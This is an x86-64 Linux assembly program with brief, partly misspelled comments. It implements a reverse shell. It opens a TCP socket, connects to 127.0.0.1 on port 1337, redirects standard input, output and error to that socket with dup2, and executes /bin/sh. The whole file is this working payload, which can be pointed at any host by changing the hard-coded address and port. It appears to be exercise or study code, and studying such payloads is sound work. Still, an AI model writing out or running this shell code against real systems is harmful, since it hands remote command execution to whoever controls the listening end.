global _start

section .text

_start:
    ; SOCKET
    mov rax, 41   ; SYS_SOCKET = 41
    mov rdi, 2    ; socket family AF_INET = 2
    mov rsi, 1    ; SOCK_STREAM = 1
    mov rdx, 0    ; protocol = 0
    syscall
    mov r9, rax   ; sockfd saved

    ; CONNECT
    mov rax, 42   ; SYS_CONNECT = 42
    mov rdi, r9   ; sockfd
    
        ; sockarrd structure creation
        mov rbx, 0x7f000001 ;IP addres localhost
        bswap rbx ; swaping to network byte order
        push rbx
        mov rbx, 0x539 ; 1337 port
        xchg bl, bh ; swaping to network byte order
        push bx 
        push word 0x02  ; pushing AF_INET=2
    
    mov rsi, rsp    ; sockarrd structure addres from stack
    mov rdx, 16  ; sizeof(serv_addr) ???
    syscall

    ; Duplicate file descriptors for stdin, stdout, and stderr
    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 0   ; socfd
    syscall

    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 1   ; socfd
    syscall

    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 2   ; socfd
    syscall

    ; RUN SHELL
    mov rax, 59  ; SYS_EXECVE = 59
    lea rdi, [shell]
    xor rsi, rsi ; NULL, const char *const argv[]("//bin/sh", "//bin/sh", 0)
    xor rdx, rdx ; NULL, const char *const envp[] (0 or 0x00)
    syscall


section .rodata
    shell db "/bin/sh", 0